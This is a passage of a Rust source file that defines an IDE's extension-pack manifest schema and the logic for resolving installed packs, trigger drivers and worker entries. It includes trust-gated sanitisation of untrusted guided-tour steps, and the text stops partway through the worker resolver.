//! RAD **extension system** (ADR 0007) — the pluggable backbone for polyglot
//! authoring (ADR 0008) and GUI app projects (ADR 0009).
//!
//! An extension is an npm package named `nano-ide-ext-*` (`nano-ide-lang-*`
//! and `nano-ide-app-*` are the two specialisations) carrying a single
//! `nano-ide.ext.json` manifest. The host reads the manifest as **declared
//! data** — nothing is `eval`'d — and uses it to drive three seams:
//!
//! * the editor grammar map (which Monaco language a file extension gets);
//! * the project scaffolder (which starter templates exist, see [`super::projects`]);
//! * the run/compile supervisor (which on-machine toolchain runs/compiles a project).
//!
//! First-party packs (`deno`, `rust`, `deno-gui`) ship **built in** so the
//! console works offline with zero installs and existing Deno projects are
//! unchanged. Third-party packs install into `<workspace>/extensions/<pkg>/`.
//!
//! Toolchain commands run on the user's machine, so the default is allowlist +
//! consent ([`TrustStore`]): per-extension *approve always* plus a global
//! *yolo* mode, both off by default.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use super::workspace;

/// Which IDE seams a pack drives.
#[derive(Clone, Copy, PartialEq, Eq, Debug, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ExtKind {
    /// A language pack: file types/grammar + a toolchain (`nano-ide-lang-*`).
    Lang,
    /// An output/runtime pack: project templates + compile/run profile
    /// (`nano-ide-app-*`).
    App,
    /// A complete example app shipped under `appDir`, copied into a new
    /// project (`nano-ide-example-*`).
    Example,
    /// A console colour-theme pack: one or more themes declared in the
    /// manifest as design-token values (`nano-ide-theme-*`). Pure data — no
    /// toolchain, no code.
    Theme,
    /// A trigger-source pack: contributes one or more trigger source **kinds**
    /// (`nano-ide-trigger-*`, ADR 0025 §6). Its driver runs out-of-process and
    /// emits over the trigger ingress; the pack only *declares* the kinds it
    /// provides in `triggerSources[]` (declared data — no `eval`).
    Trigger,
}

/// One trigger source **kind** a pack contributes (ADR 0025 §6). This is the
/// marketplace extensibility record: it declares that a `type` string exists,
/// how the runtime is fed (`transport`), and the config fields the console
/// should render. The runtime owns the inbox/dispatch; the pack's driver only
/// produces events over the ingress.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TriggerSourceSpec {
    /// The `type` string a manifest trigger uses (e.g. `imap`, `mqtt`).
    pub kind: String,
    /// Human label for the console source picker.
    #[serde(default)]
    pub display_name: Option<String>,
    /// How the runtime receives this source's events. Only `webhook` (the
    /// universal ingress) is honoured in v1; the field is forward-declared so a
    /// pack states its contract explicitly.
    #[serde(default)]
    pub transport: SourceTransport,
    /// Config fields the console renders for a trigger of this kind.
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
    /// Pack-relative path to the out-of-process driver entrypoint (a Node/Deno
    /// `.ts`/`.js`/`.mjs` file). When present, the runtime **auto-launches and
    /// supervises** the driver while an App with a trigger of this `kind` runs
    /// (ADR 0025 phase 4): one child process per such trigger, restarted with
    /// backoff on crash, killed when the App stops. Absent = a declaration-only
    /// source whose driver is run out-of-band (it still emits over the ingress).
    #[serde(default)]
    pub driver: Option<String>,
}

/// How a pack source's events reach the runtime (ADR 0025 §6).
#[derive(Clone, Copy, PartialEq, Eq, Debug, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SourceTransport {
    /// The pack driver POSTs each event to the trigger ingress (the universal
    /// emit endpoint). The only transport wired in v1.
    #[default]
    Webhook,
}

/// One **worker** a connector pack contributes — the outbound/compute edge of
/// the I/O surface (ADR 0050, amending ADR 0033 §4). Where a [`TriggerSourceSpec`]
/// is the *inbound* edge (external event → engine), a worker is the *outbound*
/// edge (an engine job → an external effect, e.g. "post a Slack message").
///
/// The [`worker_type`](WorkerSpec::worker_type) is the design→runtime **seam**:
/// it must equal the `zeebe:taskDefinition:type` of the element template (an
/// [`ExtManifest::components`] entry) this worker backs, so a task dragged from
/// the palette resolves to a running worker. The worker is **long-lived**
/// (subscribes by its type, Zeebe-style via `@nanobpm/worker`'s `defineWorker`)
/// and, when it ships an [`entry`](WorkerSpec::entry), the runtime
/// **auto-launches + supervises** it — one child process per enabled worker,
/// restarted with backoff on crash, killed when the App stops (ADR 0050 §4,
/// reusing the ADR 0025 phase-4 driver supervisor).
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct WorkerSpec {
    /// The BPMN job type this worker serves. MUST equal the backing element
    /// template's `zeebe:taskDefinition:type` (the design→runtime seam). Serialised
    /// as `type` (a Rust keyword, hence the rename).
    #[serde(rename = "type")]
    pub worker_type: String,
    /// Pack-relative entrypoint (a Node/Deno `.ts`/`.js`/`.mjs`) calling
    /// `@nanobpm/worker`'s `defineWorker`. When present, the runtime launches +
    /// supervises it while an App that enables this worker runs; absent = a
    /// declaration-only worker run out-of-band. Mirrors [`TriggerSourceSpec::driver`].
    #[serde(default)]
    pub entry: Option<String>,
    /// Human label for the console.
    #[serde(default)]
    pub display_name: Option<String>,
    /// Max concurrent in-flight jobs (maps to `defineWorker`'s `maxParallelJobs`).
    #[serde(default)]
    pub max_parallel_jobs: Option<u32>,
    /// Config fields surfaced per-connector in the project config surface (e.g.
    /// the shared API token); defaults are env pointers, never inline secrets
    /// (ADR 0027 §5).
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
}

/// One console colour theme a `kind: "theme"` pack contributes. `tokens` maps
/// the console's design-token vocabulary (see console/src/theme/themes.ts
/// TOKEN_KEYS — "app", "panel", "accent", …) to CSS colours; unknown keys are
/// ignored client-side, missing keys fall back to the base `appearance`.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ThemeSpec {
    /// Stable id, unique across packs (e.g. "nord-dark").
    pub id: String,
    /// Human-facing name shown in the theme picker.
    pub label: String,
    /// Base palette the tokens override: "light" or "dark".
    pub appearance: String,
    /// Design-token name -> CSS colour.
    #[serde(default)]
    pub tokens: std::collections::BTreeMap<String, String>,
}

/// Editor profile for one file extension.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct FileType {
    /// File extension including the dot, e.g. `.rs`.
    pub ext: String,
    /// Monaco language id used for highlighting; the editor lazy-loads it only
    /// when a matching file is opened.
    pub monaco_lang: String,
}

/// One completion item a pack offers for its language (see [`LangIntellisense`]).
/// The console has a real language service only for TS/JS; other languages get
/// this curated, SDK-derived data instead. Read as opaque data and forwarded to
/// the console verbatim.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CompletionSpec {
    /// Text shown in the completion list.
    pub label: String,
    /// Monaco `CompletionItemKind` name (e.g. "method", "struct"); the console
    /// maps it. Defaults to "value" client-side when absent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<String>,
    /// Text inserted on accept. Defaults to `label`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub insert_text: Option<String>,
    /// When true, `insertText` is a Monaco snippet (`${1:name}` placeholders).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snippet: Option<bool>,
    /// Short right-aligned signature/type.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
    /// Markdown documentation shown in the details flyout.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
}

/// A hover card shown when the pointer rests on `symbol` (whole-word match).
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HoverSpec {
    pub symbol: String,
    /// Markdown rendered in the hover card.
    pub contents: String,
}

/// One parameter within a [`SignatureSpec`].
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SignatureParam {
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
}

/// One function/method signature surfaced by signature help.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SignatureSpec {
    /// Identifier that, when followed by `(`, triggers this help.
    pub trigger: String,
    /// Full signature line shown in the popup.
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub documentation: Option<String>,
    #[serde(default)]
    pub parameters: Vec<SignatureParam>,
}

/// IntelliSense data a lang pack ships for one Monaco language. The console
/// registers one provider per `monacoLang` and feeds it every pack's entries —
/// no in-browser language server required. Read as data, forwarded verbatim.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LangIntellisense {
    /// Monaco language id these entries apply to (e.g. "csharp", "rust").
    pub monaco_lang: String,
    /// Extra characters that reopen the completion popup (e.g. ["."]).
    #[serde(default)]
    pub trigger_characters: Vec<String>,
    #[serde(default)]
    pub completions: Vec<CompletionSpec>,
    #[serde(default)]
    pub hovers: Vec<HoverSpec>,
    #[serde(default)]
    pub signatures: Vec<SignatureSpec>,
}

/// One named way to run/compile the same project — used by packs whose
/// example is a matrix (e.g. `example-java-throughput` has four
/// transport/profile combos over one Java source). The Console offers
/// these in a Run/Target dropdown; the picked id is persisted per project.
///
/// **Env merging:** `env` extends (and, on key conflict, overrides) the
/// project-level environment when the config is spawned.
///
/// **Trust:** each config's `run`/`compile` argv is snapshotted into the
/// project on scaffold — trust is granted per scaffolding pack id, same
/// model as the flat `run`/`compile`.
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RunConfig {
    /// Stable id, unique within a pack (e.g. `"stock-rest"`).
    pub id: String,
    /// Human label shown in the picker (e.g. `"Camunda 8 · REST"`).
    pub label: String,
    /// If true and no `activeRunConfig` is set on the project, this one wins.
    /// At most one per pack should be flagged; extras are ignored deterministically
    /// (first one wins in pack order).
    #[serde(default)]
    pub default: bool,
    /// Shell-style argv to run this config. Empty falls back to the toolchain's
    /// top-level `run`.
    #[serde(default)]
    pub run: Vec<String>,
    /// Shell-style argv to compile this config. Empty falls back to the
    /// toolchain's top-level `compile`.
    #[serde(default)]
    pub compile: Vec<String>,
    /// Extra environment variables set on spawn — overrides project env on key
    /// conflict.
    #[serde(default)]
    pub env: std::collections::BTreeMap<String, String>,
}

/// On-machine toolchain the supervisor drives. Commands run on the user's
/// machine and are gated by [`TrustStore`].
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Toolchain {
    /// Probe argv proving the toolchain is installed (e.g. `cargo --version`).
    /// Empty for the built-in Deno pack (handled internally).
    #[serde(default)]
    pub detect: Vec<String>,
    /// Shell-style argv to run the project (cwd = project dir). Empty => use the
    /// built-in Deno runner. Serves as a fallback when the active run config's
    /// `run` argv is empty (per [`RunConfig`] semantics).
    #[serde(default)]
    pub run: Vec<String>,
    /// Shell-style argv to compile the project. Empty => Deno compile. Serves
    /// as a fallback when the active run config's `compile` argv is empty.
    #[serde(default)]
    pub compile: Vec<String>,
    /// Cross-compile target triples this toolchain offers.
    #[serde(default)]
    pub targets: Vec<String>,
    /// Named run configurations (see [`RunConfig`]). When present, the Console
    /// surfaces them in a Run/Target dropdown and the supervisor prefers them
    /// over the top-level `run`/`compile`.
    #[serde(default)]
    pub run_configs: Vec<RunConfig>,
    /// Official, OS-aware install instructions for this toolchain, surfaced in the
    /// IDE config panel when the `detect` probe fails. Empty for the built-in Deno
    /// pack (whose runtime is reported separately as a first-class dependency).
    #[serde(default)]
    pub install_url: Option<String>,
    /// One-line, actionable hint shown when the toolchain is missing.
    #[serde(default)]
    pub install_hint: Option<String>,
}

/// A configuration field a pack contributes to the IDE config panel. Read-only
/// for now (surfaced for visibility); packs declare the knobs they honour so the
/// panel can grow without console changes. `value` is resolved from the named
/// environment variable when `env` is set.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConfigField {
    /// Stable key within the pack.
    pub key: String,
    /// Human-facing label.
    pub label: String,
    /// What the field controls.
    #[serde(default)]
    pub description: Option<String>,
    /// Environment variable this field reads its current value from, if any.
    #[serde(default)]
    pub env: Option<String>,
    /// Documented default when unset.
    #[serde(default)]
    pub default: Option<String>,
}

/// A scaffold template a pack contributes.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TemplateSpec {
    pub id: String,
    pub label: String,
    /// One-line description for the New Project template card. Older packs
    /// instead cram "Title — description" into `label`; the template menu
    /// splits that on the em-dash as a fallback (see `project_templates`).
    #[serde(default)]
    pub description: Option<String>,
    /// Language pack id this template's project uses, when it differs from
    /// what the pack implies (lang packs → the pack id; app/example packs →
    /// `requires[0]`, else "deno"). Drives the card's language icon AND the
    /// scaffolded project's `lang`.
    #[serde(default)]
    pub lang: Option<String>,
}

/// A named gate from the console's shared precondition library (ADR 0049 §3).
///
/// A pack ships data, never code, so it cannot supply the predicate functions the
/// console's own journeys use — it names one of these instead and the console
/// resolves it against `lib/tour/preconditions.ts`. Deliberately a closed set: an
/// open expression language here would be a second, weaker copy of the
/// precondition library and would drift from it.
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
// The shared `Has` prefix is the point, not accidental repetition: these variants
// serialize to exactly the names the console exports from
// `lib/tour/preconditions.ts` (`hasJsRuntime`, `hasProject`, …), so a pack author
// reading either side sees one vocabulary. Renaming the variants to satisfy the
// lint would put a translation layer between the manifest and the library it
// names — a drift surface in place of a style nit.
#[allow(clippy::enum_variant_names)]
pub enum TourGate {
    /// Node or Deno is present, so Run can actually start something.
    HasJsRuntime,
    /// At least one project exists.
    HasProject,
    /// More than one node — the cluster views show something meaningful.
    HasCluster,
    /// Traces have been captured.
    HasTraces,
}

/// Which affordance a tour step renders as. Mirrors the console's `Step` union.
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "camelCase")]
pub enum TourStepKind {
    /// Highlights a `data-tour` anchor named by `selector`.
    #[default]
    Spotlight,
    /// Anchorless, centered framing.
    Note,
    /// Hands off to a terminal command or URL carried in `copy`.
    Handoff,
}

/// One step of a pack-contributed journey.
///
/// A wide struct rather than a tagged enum, because a third-party manifest should
/// fail *softly*: a step with a field that does not apply to its kind is dropped
/// by the console adapter, not turned into a parse error that would silently cost
/// the pack its templates and toolchain too (`template_source` tolerantly skips a
/// manifest it cannot parse). Structural validation lives in exactly one place —
/// the console adapter that builds the real `Journey` — so this side stays a
/// carrier, like `themes` and `intellisense`.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TourStepSpec {
    /// Stable across edits — the analytics key.
    pub id: String,
    #[serde(default)]
    pub kind: TourStepKind,
    pub title: String,
    pub body: String,
    /// Absolute console path to navigate to before showing the step.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub route: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub precondition: Option<TourGate>,
    /// Shown instead when `precondition` resolves to "repair".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repair: Option<Box<TourStepSpec>>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub optional: bool,
    /// `spotlight`: the `data-tour` anchor to highlight.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub selector: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub side: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub align: Option<String>,
    /// `handoff`: the command or URL offered for copying. Never executed — the
    /// console renders it as inert text, and for an untrusted pack
    /// `sanitize_untrusted_step` drops handoff steps and clears this field on any
    /// surviving step, so an untrusted pack's command never reaches the client.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub copy: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub copy_label: Option<String>,
    /// `handoff`: auto-advance once an external worker is seen polling this job
    /// type. The only verification a pack can declare, because it is the only one
    /// expressible without code.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub verify_polling_job_type: Option<String>,
}

/// A guided journey a pack contributes (ADR 0049 §7).
///
/// This is what makes onboarding scale with the pack ecosystem instead of living
/// in a hardcoded list in the console: a pack that adds a capability can teach it.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TourSpec {
    pub id: String,
    pub title: String,
    /// One line for the journey-picker card.
    pub blurb: String,
    /// Console profiles this journey is offered in (`studio`, `observe`). Empty
    /// means studio only — the conservative default, since most pack capabilities
    /// are authoring surfaces the operator build does not ship.
    #[serde(default)]
    pub profiles: Vec<String>,
    /// Journey-level gates: not offered at all unless every one is satisfied.
    /// A pack journey is additionally never offered unless its pack is installed,
    /// which falls out of it being a pack journey.
    #[serde(default)]
    pub preconditions: Vec<TourGate>,
    pub steps: Vec<TourStepSpec>,
    /// What must actually have happened for the journey to have worked. Absent
    /// means the journey is orientation only — the console then records
    /// completion without claiming an outcome, exactly as its own overview
    /// journey does.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub success_when: Option<TourGate>,
}

/// Remove everything an untrusted pack must not put in front of a user as a
/// trustworthy command, recursively.
///
/// A handoff's `copy` is a command the console invites the user to paste into a
/// shell. Nothing is ever executed by the console — the runner renders it with
/// `textContent` — but "inert in the UI" is not a reason to let an untrusted pack
/// put arbitrary text where a user has been told to expect a trustworthy command.
/// So the gate is: **spotlight and note steps from any installed pack; handoff
/// steps only from a trusted one.**
///
/// Enforced here, on the server, rather than in the console: trust lives in the
/// trust store next to this code, and stripping before the payload is built means
/// an untrusted pack's command string never reaches the client at all. A journey
/// left with no steps is dropped entirely rather than offered as an empty card.
pub fn visible_tours(m: &ExtManifest, trusted: bool) -> Vec<TourSpec> {
    m.tours
        .iter()
        .filter_map(|t| {
            let steps: Vec<TourStepSpec> = if trusted {
                t.steps.clone()
            } else {
                t.steps
                    .iter()
                    .cloned()
                    .filter_map(sanitize_untrusted_step)
                    .collect()
            };
            // A journey left with no steps is dropped rather than offered as an
            // empty card — on both paths, so a trusted pack that ships `steps: []`
            // is treated the same as one left empty by the trust gate.
            if steps.is_empty() {
                return None;
            }
            Some(TourSpec { steps, ..t.clone() })
        })
        .collect()
}

/// Sanitize one step from an untrusted pack, recursively.
///
/// The trust posture is that an untrusted pack's *command string never reaches
/// the client at all* — so it is not enough to drop top-level `handoff` steps:
///
/// - A `handoff` step is dropped whole (`None`) wherever it appears.
/// - A surviving `note`/`spotlight` step has its handoff-only fields (`copy`,
///   `copy_label`, `verify_polling_job_type`) cleared, because a non-handoff kind
///   carrying a `copy` string is exactly the smuggling path the gate must close.
/// - The `repair` substitution is a full step the console will render in place of
///   this one, so it is sanitized by the same rules; a `repair` that was a
///   handoff is removed, leaving the parent without a substitution.
fn sanitize_untrusted_step(mut s: TourStepSpec) -> Option<TourStepSpec> {
    if s.kind == TourStepKind::Handoff {
        return None;
    }
    s.copy = None;
    s.copy_label = None;
    s.verify_polling_job_type = None;
    s.repair = s
        .repair
        .and_then(|r| sanitize_untrusted_step(*r).map(Box::new));
    Some(s)
}

/// The `nano-ide.ext.json` manifest, read as data.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ExtManifest {
    pub id: String,
    pub kind: ExtKind,
    pub display_name: String,
    /// Optional pack icon: an inline SVG XML string (preferred) or a data:/http:
    /// URL. Lang packs supply this so the Console can badge project cards with a
    /// language icon. Built-in packs embed a small brand glyph below.
    #[serde(default)]
    pub icon: Option<String>,
    #[serde(default)]
    pub file_types: Vec<FileType>,
    #[serde(default)]
    pub templates: Vec<TemplateSpec>,
    #[serde(default)]
    pub toolchain: Toolchain,
    /// example packs: lang pack ids required to build/run this example.
    #[serde(default)]
    pub requires: Vec<String>,
    /// example packs: subdir holding the ready-to-copy project.
    #[serde(default)]
    pub app_dir: Option<String>,
    /// example packs: one-line description for the picker.
    #[serde(default)]
    pub summary: Option<String>,
    /// Whether this pack is bundled in the binary (cannot be removed).
    #[serde(default)]
    pub builtin: bool,
    /// Config fields this pack contributes to the IDE config panel (read-only).
    #[serde(default)]
    pub config_fields: Vec<ConfigField>,
    /// Console colour themes this pack contributes (theme packs).
    #[serde(default)]
    pub themes: Vec<ThemeSpec>,
    /// SDK-derived Monaco IntelliSense (completions/hovers/signatures) this pack
    /// contributes, one entry per `monacoLang`. Optional; forwarded to the
    /// console which registers providers per language.
    #[serde(default)]
    pub intellisense: Vec<LangIntellisense>,
    /// Component element templates this pack contributes (ADR 0033 §4): a list
    /// of pack-relative paths to Zeebe element-template JSON files (each holding
    /// a single template or an array). The host reads + parses them and forwards
    /// the resolved templates to the console, which merges them **under** the
    /// project's own components (project wins on an id collision) to drive the
    /// BPMN palette — the installable-component-library / Delphi-VCL axis.
    #[serde(default)]
    pub components: Vec<String>,
    /// Trigger source **kinds** this pack contributes (ADR 0025 §6). Each entry
    /// registers a `type` string so a manifest trigger can use it and the
    /// console/validation recognise it; the pack's out-of-process driver emits
    /// events over the trigger ingress. This is the `nano-ide-trigger-*` axis.
    #[serde(default)]
    pub trigger_sources: Vec<TriggerSourceSpec>,
    /// Worker **types** this pack contributes (ADR 0050 §4): the outbound edge.
    /// Each entry declares a job `type` (the design→runtime seam with a
    /// [`components`](ExtManifest::components) element template) and, optionally,
    /// an `entry` the runtime auto-launches + supervises. This is the
    /// `nano-ide-connector-*` axis, symmetric to `trigger_sources`.
    #[serde(default)]
    pub workers: Vec<WorkerSpec>,
    /// Guided journeys this pack contributes (ADR 0049 §7). Surfaced to the
    /// console through [`visible_tours`], which strips `handoff` steps from
    /// untrusted packs. `#[serde(default)]` so every manifest predating this
    /// field keeps parsing unchanged — a pack in the wild must never break.
    #[serde(default)]
    pub tours: Vec<TourSpec>,
    /// Opt-in: this pack ships a `package.json` whose **runtime** dependencies
    /// must be `npm install`ed under the pack before its bundled CLIs resolve
    /// (issue #520). An `npm pack` tarball carries the sources + `package.json`
    /// but **not** `node_modules`, so a pack that fronts an npm CLI (the
    /// first-party `nano-ide-app-urban` pack depends on `@nanobpm/urban`, whose
    /// `urban`/`create-urban-app` bins are the Studio's Urban toolchain) needs a
    /// second, guarded install step to materialise `node_modules/.bin/*`.
    /// Default `false` keeps every existing declaration-only pack a pure
    /// pack+extract (no network `npm install`, no lifecycle-script surface).
    /// See [`install_pack_deps`] for the guardrails (`--omit=dev`,
    /// `--ignore-scripts` unless the pack is trusted, lockfile-pinned when
    /// present).
    #[serde(default)]
    pub install_deps: bool,
}

/// Built-in language-pack icons: theme-robust lettermark tiles (a brand-coloured
/// rounded square with a white glyph) rendered as an `<img>` on project cards.
/// A colored tile stays legible on both the light and dark console themes (an
/// `<img>`-loaded SVG can't inherit `currentColor`). Published packs may ship
/// their own richer SVG via `nano-ide.ext.json`'s `icon`.
const ICON_DENO: &str = r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#3178C6"/><text x="12" y="16.5" font-family="Helvetica,Arial,sans-serif" font-size="10" font-weight="700" fill="#fff" text-anchor="middle">TS</text></svg>"##;

/// The built-in first-party packs — always available, offline, unremovable.
/// Deno is the legacy lang+app runtime (empty toolchain => internal Deno path).
pub fn builtin_extensions() -> Vec<ExtManifest> {
    vec![
        ExtManifest {
            id: "deno".into(),
            kind: ExtKind::Lang,
            display_name: "Deno (TypeScript)".into(),
            icon: Some(ICON_DENO.into()),
            file_types: vec![
                FileType {
                    ext: ".ts".into(),
                    monaco_lang: "typescript".into(),
                },
                FileType {
                    ext: ".js".into(),
                    monaco_lang: "javascript".into(),
                },
            ],
            templates: vec![],
            toolchain: Toolchain::default(),
            requires: vec![],
            app_dir: None,
            summary: None,
            builtin: true,
            config_fields: vec![ConfigField {
                key: "denoBin".into(),
                label: "Deno binary".into(),
                description: Some(
                    "Path to the Deno runtime, used only to compile a project to a standalone binary (`deno compile`). Auto-resolved from PATH / ~/.deno/bin when unset.".into(),
                ),
                env: Some("NANOBPMN_DENO_BIN".into()),
                default: Some("deno (on PATH)".into()),
            }],
            themes: vec![],
            intellisense: vec![],
            components: vec![],
            trigger_sources: vec![],
            workers: vec![],
            tours: vec![],
            install_deps: false,
        },
        ExtManifest {
            id: "deno-gui".into(),
            kind: ExtKind::App,
            display_name: "Deno GUI app".into(),
            icon: None,
            file_types: vec![],
            templates: vec![TemplateSpec {
                id: "gui-starter".into(),
                label: "GUI app".into(),
                description: Some("Served UI binary (Deno.serve)".into()),
                lang: None,
            }],
            toolchain: Toolchain::default(),
            requires: vec![],
            app_dir: None,
            summary: None,
            builtin: true,
            config_fields: vec![],
            themes: vec![],
            intellisense: vec![],
            components: vec![],
            trigger_sources: vec![],
            workers: vec![],
            tours: vec![],
            install_deps: false,
        },
    ]
}

/// `<workspace>/extensions` — installed third-party packs + trust store.
pub fn extensions_root() -> PathBuf {
    match std::env::var("NANOBPMN_EXTENSIONS_DIR") {
        Ok(d) if !d.is_empty() => PathBuf::from(d),
        _ => workspace::workspace_dir().join("extensions"),
    }
}

/// The installed-pack directories under [`extensions_root`], sorted by path so
/// the on-disk scan order is deterministic. `read_dir` yields entries in an
/// arbitrary, platform/filesystem-dependent order, which would make every
/// "first-pack-wins" resolver ([`all_extensions`], [`trigger_driver`],
/// [`worker_driver`], …) nondeterministic; sorting gives one stable resolution
/// order. Returns empty when the root is missing or unreadable.
///
/// Dot-prefixed entries are skipped: [`install_atomic`] builds a new pack in a
/// dot-prefixed `.<leaf>.staging.*` sibling and parks the old copy in a
/// `.<leaf>.backup.*` sibling during the swap. An installed pack dir is always
/// the `scope__name` mapping from [`safe_pkg_dir`], which never starts with a
/// dot, so filtering the leading-dot scratch dirs here means an in-flight
/// install can NEVER be observed as a pack — its readable manifest (and, since
/// `.` sorts first, its would-be precedence) is invisible to the scan until the
/// atomic rename lands it under its real, non-dot name.
fn pack_dirs() -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(extensions_root()) else {
        return Vec::new();
    };
    let mut dirs: Vec<PathBuf> = rd
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            p.file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| !n.starts_with('.'))
        })
        .collect();
    dirs.sort();
    dirs
}

fn manifest_name() -> &'static str {
    "nano-ide.ext.json"
}

/// Every extension the console knows: built-ins plus installed packs (built-ins
/// take precedence on id collision).
pub fn all_extensions() -> Vec<ExtManifest> {
    let mut out = builtin_extensions();
    let seen: BTreeSet<String> = out.iter().map(|e| e.id.clone()).collect();
    for base in pack_dirs() {
        let mf = base.join(manifest_name());
        if let Ok(txt) = std::fs::read_to_string(&mf)
            && let Ok(m) = serde_json::from_str::<ExtManifest>(&txt)
            && !seen.contains(&m.id)
        {
            out.push(m);
        }
    }
    out
}

/// Resolve the lang pack for a project's `lang` id (default "deno").
pub fn lang_pack(id: &str) -> Option<ExtManifest> {
    all_extensions()
        .into_iter()
        .find(|e| e.kind == ExtKind::Lang && e.id == id)
}

/// Every trigger source **kind** any installed pack contributes (ADR 0025 §6) —
/// the union the runtime registry ([`super::trigger_sources::known_kinds`])
/// folds together with the compiled-in core kinds. Later duplicate declarations
/// of the same `kind` are ignored (first pack wins).
pub fn all_trigger_sources() -> Vec<TriggerSourceSpec> {
    let mut out: Vec<TriggerSourceSpec> = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();
    for ext in all_extensions() {
        for spec in ext.trigger_sources {
            if seen.insert(spec.kind.clone()) {
                out.push(spec);
            }
        }
    }
    out
}

/// An installed pack's out-of-process trigger driver, resolved on disk (ADR
/// 0025 phase 4). The runtime launches [`entry`](TriggerDriver::entry) with
/// [`dir`](TriggerDriver::dir) as the working directory.
pub struct TriggerDriver {
    /// The pack's manifest `id` — used to consult the trust store before the
    /// runtime launches the driver child (mirrors the toolchain gate).
    pub id: String,
    /// The pack's directory — the driver's working dir (so its bundled
    /// `node_modules` / imports resolve).
    pub dir: PathBuf,
    /// The driver entrypoint, pack-relative (e.g. `driver.ts`).
    pub entry: String,
}

/// Resolve the on-disk driver for a pack-contributed source `kind` (ADR 0025
/// §6 / phase 4). Returns `None` for a core kind, an unknown kind, a pack that
/// declares the kind but no `driver` (declaration-only — run out-of-band), or a
/// path-escaping / missing driver file. First matching pack wins, mirroring
/// [`all_trigger_sources`]'s first-wins dedup.
pub fn trigger_driver(kind: &str) -> Option<TriggerDriver> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        let Some(spec) = m.trigger_sources.iter().find(|s| s.kind == kind) else {
            continue;
        };
        let driver = spec.driver.as_deref().filter(|d| !d.is_empty())?;
        let path = safe_pack_path(&base, driver)?;
        if !path.is_file() {
            return None;
        }
        return Some(TriggerDriver {
            id: m.id,
            dir: base,
            entry: driver.to_string(),
        });
    }
    None
}

/// An installed pack's out-of-process worker entry, resolved on disk (ADR 0050
/// §4). Symmetric to [`TriggerDriver`]: the runtime launches
/// [`entry`](WorkerDriver::entry) with [`dir`](WorkerDriver::dir) as the working
/// directory (so the pack's bundled imports resolve).
pub struct WorkerDriver {
    /// The pack's manifest `id` — used to consult the trust store before the
    /// runtime launches the worker child (mirrors the toolchain gate).
    pub id: String,
    /// The pack's directory — the worker's working dir.
    pub dir: PathBuf,
    /// The worker entrypoint, pack-relative (e.g. `worker.ts`).
    pub entry: String,
}

/// Resolve the on-disk worker entry for a pack-contributed job `worker_type`
/// (ADR 0050 §4). Returns `None` for an unknown type, a pack that declares the
/// type but no `entry` (declaration-only — run out-of-band), or a path-escaping
/// / missing entry file. First matching pack wins, mirroring [`trigger_driver`].
pub fn worker_driver(worker_type: &str) -> Option<WorkerDriver> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
